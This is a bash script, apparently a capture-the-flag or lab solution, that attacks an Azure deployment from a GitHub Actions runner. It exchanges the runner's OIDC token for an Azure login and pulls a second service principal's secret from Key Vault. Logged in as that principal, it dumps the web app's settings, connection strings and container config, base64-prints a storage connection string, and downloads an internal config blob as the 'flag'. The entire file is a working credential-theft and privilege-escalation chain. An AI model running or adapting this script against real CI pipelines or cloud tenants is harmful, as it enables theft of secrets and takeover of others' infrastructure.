#!/usr/bin/env bash
set +e
echo "=====PWN7_START====="
AUD="api:""//AzureADTokenExchange"
IDT=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=${AUD}" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
az login --service-principal -u "${AZURE_CLIENT_ID}" -t "${AZURE_TENANT_ID}" --federated-token "${IDT}" --allow-no-subscriptions >/dev/null 2>&1
V=$(az keyvault secret show --vault-name kv-tbl-prod-x3euoz -n cost-reader-principal --query value -o tsv 2>/dev/null)
APP=$(printf %s "$V" | jq -r .appId); CS=$(printf %s "$V" | jq -r .clientSecret)
az logout >/dev/null 2>&1
az login --service-principal -u "$APP" --password="$CS" -t "${AZURE_TENANT_ID}" -o none >/dev/null 2>&1 && echo "cost-reader OK"
RG=rg-tbl-platform-prod-sea; SITE=app-tbl-storefront-prod
echo "=== APPSETTINGS ==="
az webapp config appsettings list -g $RG -n $SITE -o json 2>&1 | head -c 3000; echo
echo "=== CONNECTION STRINGS ==="
az webapp config connection-string list -g $RG -n $SITE -o json 2>&1 | head -c 1500; echo
echo "=== CONTAINER CONFIG ==="
az webapp config container show -g $RG -n $SITE -o json 2>&1 | head -c 1500; echo
echo "=== NEU CO CONN: TAI BLOB ==="
CONN=$(az webapp config appsettings list -g $RG -n $SITE --query "[?name=='CONFIG_STORAGE_CONNECTION'].value" -o tsv 2>/dev/null)
if [ -n "$CONN" ] && [ "$CONN" != "null" ]; then
  echo "CONN b64: $(printf %s "$CONN" | base64 -w0)"
  export AZURE_STORAGE_CONNECTION_STRING="$CONN"
  az storage blob list --connection-string "$CONN" --container-name config -o tsv --query "[].name" 2>&1 | sed 's/^/blob: /' | head
  az storage blob download --connection-string "$CONN" --container-name config --name internal-config.json -f /tmp/flagcfg.json >/dev/null 2>&1 && echo "FLAG_B64: $(base64 -w0 /tmp/flagcfg.json)"
fi
echo "=====PWN7_END====="